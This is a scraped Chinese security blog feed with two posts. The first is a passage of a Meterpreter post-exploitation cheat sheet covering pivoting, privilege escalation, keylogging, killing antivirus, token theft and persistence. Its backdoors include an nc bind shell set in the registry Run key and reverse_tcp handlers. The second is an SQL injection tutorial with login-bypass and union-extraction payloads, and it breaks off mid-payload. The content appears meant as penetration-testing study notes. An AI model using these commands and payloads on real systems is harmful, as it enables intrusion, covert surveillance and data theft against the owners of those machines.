class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-8-搜索文件"><a href="#4-8-搜索文件" class="headerlink" title="4.8 搜索文件"></a>4.8 搜索文件</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; search -hUsage: search [-d dir] [-r recurse] -f pattern [-f pattern]...Search for files.OPTIONS:    -d &lt;opt&gt;  #开始搜索的目录&#x2F;驱动器。留空以搜索所有驱动器(默认值：）    -f &lt;opt&gt;  #要搜索的文件模式glob(e、 g.*秘密*.doc？）    -h        Help Banner    -r &lt;opt&gt;  #递归搜索子目录(默认值：true）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-9-网络命令"><a href="#4-9-网络命令" class="headerlink" title="4.9 网络命令"></a>4.9 网络命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig&#x2F;ifconfignetstat –anoarpgetproxy   #查看代理信息route   #查看路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-10-端口转发"><a href="#4-10-端口转发" class="headerlink" title="4.10 端口转发"></a>4.10 端口转发</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS:    -L &lt;opt&gt;  #转发：要侦听的本地主机（可选）。反向：要连接的本地主机。    -R        #表示反向端口正向。    -h        Help banner.    -i &lt;opt&gt;  #要与之交互的端口转发条目的索引（请参阅“list”命令）。    -l &lt;opt&gt;  #转发：要侦听的本地端口。反向：要连接的本地端口    -p &lt;opt&gt;  #转发：要连接的远程端口。反向：监听的远程端口。    -r &lt;opt&gt;  #转发：要连接到的远程主机。例：portfwd add -l 6666 -p 3389 -r 127.0.0.1#将目标机的3389端口转发到本地6666端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-11-添加路由"><a href="#4-11-添加路由" class="headerlink" title="4.11 添加路由"></a>4.11 添加路由</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run autoroute -h[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...][*] Usage:   run autoroute [-r] -s subnet -n netmask[*] Examples:[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1&#x2F;255.255.255.0[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0[*]   run autoroute -s 10.10.10.1&#x2F;24              # CIDR notation is also okay[*]   run autoroute -p                            # Print active routing table[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1&#x2F;255.255.255.0 route[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes例：run autoroute -s 192.168.159.0&#x2F;24  #添加到目标环境网络run autoroute –p  #查看添加的路由#利用arp_scanner\portscan 进行扫描run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;run auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp RHOSTS&#x3D;  PORTS&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-12-Socks4a代理"><a href="#4-12-Socks4a代理" class="headerlink" title="4.12 Socks4a代理"></a>4.12 Socks4a代理</h3><p><code>autoroute</code>添加完路由后，还可以利用<strong>msf</strong>自带的<code>sock4a</code>模块进行<code>Socks4a</code>代理</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msf&gt; use auxiliary&#x2F;server&#x2F;socks4a msf &gt; set srvhost 127.0.0.1msf &gt; set srvport 1080msf &gt; runvi &#x2F;etc&#x2F;proxychains.conf #添加 socks4 127.0.0.1 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-13-信息收集"><a href="#4-13-信息收集" class="headerlink" title="4.13 信息收集"></a>4.13 信息收集</h3><p>位置：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;gather&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;linux&#x2F;gather#常用脚本run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #查看分区run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #获取安装软件信息run post&#x2F;windows&#x2F;gather&#x2F;dumplinks   #获取最近的文件操作run post&#x2F;windows&#x2F;gather&#x2F;enum_ie  #获取IE缓存run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome   #获取Chrome缓存run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #补丁信息run post&#x2F;windows&#x2F;gather&#x2F;enum_domain  #查找域控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-14-提权"><a href="#4-14-提权" class="headerlink" title="4.14 提权"></a>4.14 提权</h3><h4 id="4-14-1-getsystem"><a href="#4-14-1-getsystem" class="headerlink" title="4.14.1 getsystem"></a>4.14.1 getsystem</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">getsystem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>getsystem</code>创建一个新的<strong>Windows</strong>服务，设置为<strong>SYSTEM</strong>运行，当它启动时连接到一个命名管道。</li><li><code>getsystem</code>产生一个进程，它创建一个命名管道并等待来自该服务的连接。</li><li><strong>Windows</strong>服务已启动，导致与命名管道建立连接。</li><li>该进程接收连接并调用<code>ImpersonateNamedPipeClient</code>，从而为<strong>SYSTEM</strong>用户创建模拟令牌。</li></ul><p>然后用新收集的<strong>SYSTEM</strong>模拟令牌产生<strong>cmd.exe</strong>，并且我们有一个<strong>SYSTEM</strong>特权进程。</p><h4 id="4-14-2-bypassuac-rb"><a href="#4-14-2-bypassuac-rb" class="headerlink" title="4.14.2 bypassuac.rb"></a>4.14.2 bypassuac.rb</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bypassuac#内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：use exploit&#x2F;windows&#x2F;local&#x2F;bypassuacuse exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injectionuse windows&#x2F;local&#x2F;bypassuac_vbsuse windows&#x2F;local&#x2F;ask如使用bypassuac.rb脚本：msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuacmsf &gt; set SESSION 2msf &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-14-3-内核漏洞提权"><a href="#4-14-3-内核漏洞提权" class="headerlink" title="4.14.3 内核漏洞提权"></a>4.14.3 内核漏洞提权</h4><p>可先利用enum_patches模块收集补丁信息，然后查找可用的exploits进行提权，需要退出当前连接</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #查看补丁信息msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_schlampereimsf &gt; set SESSION 2msf &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-15-远程桌面-截图"><a href="#4-15-远程桌面-截图" class="headerlink" title="4.15 远程桌面/截图"></a>4.15 远程桌面/截图</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">enumdesktops  #查看可用的桌面getdesktop    #获取当前meterpreter 关联的桌面set_desktop   #设置meterpreter关联的桌面  -h查看帮助screenshot  #截屏use espia  #或者使用espia模块截屏  然后输入screengrabrun vnc  #使用vnc远程桌面连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-16-rdp-用户添加"><a href="#4-16-rdp-用户添加" class="headerlink" title="4.16 rdp/用户添加"></a>4.16 rdp/用户添加</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run getgui –h[!] Meterpreter scripts are deprecated. Try post&#x2F;windows&#x2F;manage&#x2F;enable_rdp.[!] Example: run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp OPTION&#x3D;value [...]Windows Remote Desktop Enabler Meterpreter ScriptUsage: getgui -u &lt;username&gt; -p &lt;password&gt;Or:    getgui -eOPTIONS:    -e        Enable RDP only.    -f &lt;opt&gt;  Forward RDP Connection.    -h        Help menu.    -p &lt;opt&gt;  The Password of the user to add.    -u &lt;opt&gt;  The Username of the user to add.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#1run getgui -e #开启远程桌面run getgui -u lltest2 -p 123456   #添加用户run getgui -f 6661 –e   #3389端口转发到6661#2run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-17-键盘记录"><a href="#4-17-键盘记录" class="headerlink" title="4.17 键盘记录"></a>4.17 键盘记录</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">keyscan_start  #开始键盘记录keyscan_dump   #导出记录数据keyscan_stop #结束键盘记录这边要说一点就是，导出记录的话要在keyscan_stop命令之前，不然结束了就无法导出了meterpreter &gt; keyscan_startStarting the keystroke sniffer ...meterpreter &gt; keyscan_dump  #每次转储后，命令都会打印出来，然后再次转储的话是从上一次键盘结束开始记录的Dumping captured keystrokes...fffff&lt;CR&gt;&lt;CR&gt;&lt;CR&gt;fff&lt;CR&gt;&lt;CR&gt;&lt;CR&gt;meterpreter &gt; keyscan_stopStopping the keystroke sniffer...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-18-sniffer-抓包"><a href="#4-18-sniffer-抓包" class="headerlink" title="4.18 sniffer 抓包"></a>4.18 sniffer 抓包</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use sniffersniffer_interfaces   #查看网卡sniffer_start 2   #选择网卡 开始抓包sniffer_stats 2   #查看状态sniffer_dump 2 &#x2F;tmp&#x2F;lltest.pcap  #导出pcap数据包sniffer_stop 2   #停止抓包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-注册表操作"><a href="#5-注册表操作" class="headerlink" title="5  注册表操作"></a>5  注册表操作</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter reg –hUsage: reg [command] [options]Interact with the target machine&#39;s registry.OPTIONS:    -d &lt;opt&gt;  The data to store in the registry value.#注册表中值的数据    -h        Help menu.    -k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).#注册表键路径    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials#要连接的远程计算机名称（使用当前进程凭据）    -t &lt;opt&gt;  The registry value type (E.g. REG_SZ).#注册表值类型    -v &lt;opt&gt;  The registry value name (E.g. Stuff).#注册表键名称    -w        Set KEY_WOW64 flag, valid values [32|64].#设置32位注册列表还是64位COMMANDS:    enumkey  Enumerate the supplied registry key [-k &lt;key&gt;]#枚举可获得的键    createkey  Create the supplied registry key  [-k &lt;key&gt;]#创建提供的注册表项    deletekey  Delete the supplied registry key  [-k &lt;key&gt;]#删除提供的注册表项    queryclass Queries the class of the supplied key [-k &lt;key&gt;]#查询键值数据    setval Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]#设置键值    deleteval  Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]#删除提供的注册表值    queryval Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]#查询值的数据内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注册表设置nc后门</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">upload &#x2F;Users&#x2F;ascotbe&#x2F;Downloads&#x2F;netcat-1.11&#x2F;nc.exe C:\\windows\\system32 #上传nc,前面的是你要上传文件的位置reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的keyreg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#39;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#39; #设置键值reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值nc -v 192.168.0.142 443  #攻击者连接nc后门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-令牌操纵"><a href="#6-令牌操纵" class="headerlink" title="6.令牌操纵"></a>6.令牌操纵</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#假冒令牌use incognito      help incognito  #查看帮助list_tokens -u    #查看可用的tokenimpersonate_token &#39;NT AUTHORITY\SYSTEM&#39;  #假冒SYSTEM token,或者用下面的impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\execute -f cmd.exe -i –t    # -t 使用假冒的token 执行或者直接shellrev2self   #返回原始token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>steal_token 窃取令牌</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; steal_tokenUsage: steal_token [pid]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="7-关闭杀软"><a href="#7-关闭杀软" class="headerlink" title="7 关闭杀软"></a>7 关闭杀软</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run killav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-后门植入"><a href="#8-后门植入" class="headerlink" title="8 后门植入"></a>8 后门植入</h2><h5 id="persistence启动项后门"><a href="#persistence启动项后门" class="headerlink" title="persistence启动项后门"></a>persistence启动项后门</h5><p>在<code>C:\Users\XXXXX\AppData\Local\Temp\</code>目录下，上传一个<strong>vbs</strong>脚本<br>在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项</p><pre class="line-numbers language-none"><code class="language-none">BASHrun persistence –h  #查看帮助run persistence -X -i 5 -p 6661 -r 192.168.159.134#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>连接后门</strong></p><pre class="line-numbers language-none"><code class="language-none">BASHmsf &gt; use exploit&#x2F;multi&#x2F;handlermsf &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcpmsf &gt; set LHOST 192.168.159.134msf &gt; set LPORT 6661msf &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="metsvc服务后门"><a href="#metsvc服务后门" class="headerlink" title="metsvc服务后门"></a>metsvc服务后门</h4><p>在<code>C:\Users\XXXXX\AppData\Local\Temp\</code>上传了三个文件（<strong>metsrv.x86.dll</strong>、<strong>metsvc-server.exe</strong>、<strong>metsvc.exe</strong>），通过服务启动，服务名为<strong>meterpreter</strong></p><pre class="line-numbers language-none"><code class="language-none">BASHrun metsvc –h   # 查看帮助run metsvc –A   #自动安装后门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>连接后门</strong></p><pre class="line-numbers language-none"><code class="language-none">BASHmsf &gt; use exploit&#x2F;multi&#x2F;handlermsf &gt; set payload windows&#x2F;metsvc_bind_tcpmsf &gt; set RHOST 192.168.159.144msf &gt; set LPORT 31337msf &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考链接</p><p>：<a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></p><p>：<a href="https://www.ascotbe.com/2020/05/06/MeterpreterCommand/">https://www.ascotbe.com/2020/05/06/MeterpreterCommand/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入基础</title>
      <link href="2020/07/12/sql-zhu-ru-ji-chu/"/>
      <url>2020/07/12/sql-zhu-ru-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h1><span id="more"></span><h2 id="1-1基于mysql的sql注入"><a href="#1-1基于mysql的sql注入" class="headerlink" title="1. 1基于mysql的sql注入"></a>1. 1基于mysql的sql注入</h2><h3 id="1-1-1-SQL注入形成原因"><a href="#1-1-1-SQL注入形成原因" class="headerlink" title="1.1.1 SQL注入形成原因"></a>1.1.1 SQL注入形成原因</h3><p>sql注入是开发者没有对用户的输入数据进行严格的限制，转义，致使用户在输入一些特定字符时，在与后端 设定的sq语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信；</p><h3 id="1-1-2常见的登录查询代码"><a href="#1-1-2常见的登录查询代码" class="headerlink" title="1.1.2常见的登录查询代码"></a>1.1.2常见的登录查询代码</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token keyword">user</span><span class="token punctuation">`</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$username'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$password'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录成功的判断逻辑不尽相同，但是都建立在sql语句能够查询出来结果的前提上的</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#提交 username=admin&amp;password=123456</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token comment">#提交 username=xxx'or 1=1 #&amp;password=xxx</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span><span class="token string">'xxx'</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#'and password='xxx'</span><span class="token comment">#  #号是注释符，由于1=1 恒成立，使得该语句等价 select * from </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-3-union-order-by-注入"><a href="#1-1-3-union-order-by-注入" class="headerlink" title="1.1.3 union/order by 注入"></a>1.1.3 union/order by 注入</h3><p>执行以下语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">#union 后的select 语句取出的列数必须与uinon前取出的相同</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment"># 使用order by 获取原来语句的select 的列数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2020/07/12/sql-zhu-ru-ji-chu/image-20210424115914985.png" class="slug"><h3 id="1-1-4-数据库信息的获取"><a href="#1-1-4-数据库信息的获取" class="headerlink" title="1.1.4 数据库信息的获取"></a>1.1.4 数据库信息的获取</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token string">'union select database(),2,3 #'</span> 获取当前数据库 xxx <span class="token string">'union select user(),2,3 # '</span>  获取当前用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#利用mysql自带的库 information_schema,这个库存储了mysql的全部信息，可以获取某个数据库的表名和列名</span><span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schma<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xxx' <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token number">0x637466</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（1） group_concat函数的作用是把一列的数据用逗号拼接</p><p>（2）information_schema.tables 是指information_schema库下的tables表；where语句只是为了取出当前数据库的表，否则表名会很多</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">取列名xxx&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_name&#x3D;&#39;flag&#39; #xxx&#39; union select group_concat(flag),2,3 from flag如果information_schema被过滤掉，还有以下的库可以取得表名：sys.schema_auto_increment_columns的table_name列，存在table_schemasys.schema_table_statistics_with_buffer的table_name列，存在table_schemamysql.innodb_table_stats的table_name列，存在database_namemysql.innodb_index_stats的table_name列，存在database_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> card <span class="token keyword">where</span> id<span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">SELECT</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span>  取当前数据库的库名<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> card <span class="token keyword">where</span> id<span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">SELECT</span> <span class="token keyword">USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span>  取当前用户名<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> card <span class="token keyword">where</span> id<span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">SELECT</span> GROUP_CONCAT<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">TABLES</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   取某个数据库的表名和列名<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> card <span class="token keyword">WHERE</span> ID <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> GROUP_CONCAT<span class="token punctuation">(</span>COLUMN_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">COLUMNS</span> <span class="token keyword">WHERE</span> TABLE_name<span class="token operator">=</span><span class="token string">'card'</span><span class="token comment">#   取列名</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> card <span class="token keyword">WHERE</span> ID <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> GROUP_CONCAT<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">FROM</span> card  <span class="token comment">#取数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-5-SQL注入绕过"><a href="#1-1-5-SQL注入绕过" class="headerlink" title="1.1.5 SQL注入绕过"></a>1.1.5 SQL注入绕过</h3><h5 id="1-绕过空格"><a href="#1-绕过空格" class="headerlink" title="1.绕过空格"></a>1.绕过空格</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1.</span>使用注释符<span class="token keyword">select</span> <span class="token comment">/**/</span> xxx <span class="token comment">/**/</span><span class="token keyword">from</span> <span class="token comment">/**/</span> xx<span class="token punctuation">;</span><span class="token number">2.</span> 俩个空格代替一个空格 ，利用tab代替空格，<span class="token operator">%</span>A0 <span class="token operator">=</span>空格<span class="token number">3.</span>使用浮点数<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">8.</span>o <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">8</span>E0 <span class="token keyword">union</span> <span class="token keyword">select</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2-括号绕过空格："><a href="#2-括号绕过空格：" class="headerlink" title="2. 括号绕过空格："></a>2. 括号绕过空格：</h5><p>如果空格被过滤，括号没有被过滤，可以用括号绕过</p><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> 这种方法常用来<span class="token keyword">time</span> based 盲注？id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token operator">and</span><span class="token punctuation">(</span>sleep<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>form<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>上面的方法既没有逗号也没有空格。猜解<span class="token 